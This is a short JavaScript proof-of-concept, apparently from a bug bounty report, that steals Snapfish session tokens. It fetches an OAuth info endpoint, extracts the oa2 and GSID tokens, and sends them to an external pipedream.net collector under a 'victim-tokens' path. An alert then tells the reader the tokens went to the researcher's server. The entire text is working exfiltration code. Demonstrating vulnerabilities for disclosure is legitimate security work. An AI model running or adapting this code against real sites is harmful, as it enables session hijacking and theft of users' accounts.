fetch('https://www.snapfish.com/library/getOauthInfo')
  .then(response => response.json())
  .then(data => {
    const { oa2, GSID } = data.oauthInfo;
    const targetUrl = `https://eo12abo0keh9aa.m.pipedream.net/victim-tokens?oa2=${encodeURIComponent(oa2)}&GSID=${encodeURIComponent(GSID)}`;
    
    return fetch(targetUrl, { method: 'GET' });
  })
  .then(response => alert("Your session tokens have already been sent to @marciosz’s server. Just search for 'GET /victim-tokens' in your Burp history."))
  .catch(error => {
    alert("Error sending tokens: " + error);
  });
